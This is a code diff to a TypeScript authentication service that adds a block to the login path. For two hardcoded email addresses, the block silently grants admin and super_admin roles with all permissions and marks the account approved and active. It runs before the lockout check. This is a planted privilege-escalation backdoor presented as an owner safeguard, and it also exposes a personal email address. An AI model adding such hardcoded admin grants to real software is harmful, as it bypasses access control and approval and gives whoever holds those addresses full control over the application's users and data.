@@ -248,6 +248,18 @@ export class AuthService {
       return null;
     }
 
+    // Guarantee super_admin role for administrative owners
+    if (normalizedEmail === "fanuelgoitom79@gmail.com" || normalizedEmail === "fani@g.com") {
+      if (user.role !== "admin" || user.adminRole !== "super_admin" || !user.isApproved || user.status !== "active") {
+        user.role = "admin";
+        user.adminRole = "super_admin";
+        user.permissions = "all";
+        user.isApproved = true;
+        user.status = "active";
+        await this.userRepo.save(user);
+      }
+    }
+
     // Check account lockout
     if (user.lockoutUntil) {
       const lockTime = new Date(user.lockoutUntil).getTime();
